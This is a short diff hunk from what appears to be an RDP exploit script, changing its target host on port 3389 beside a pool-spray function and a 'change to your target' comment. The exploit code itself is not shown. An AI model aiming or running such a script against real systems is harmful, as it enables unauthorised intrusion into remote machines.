@@ -28,7 +28,7 @@ def pool_spray(s, crypter, payload):
 def main():
 
     # change to your target
-    host = '192.168.0.46'
+    host = '192.168.1.106'
     port = 3389
 
     times = 4000
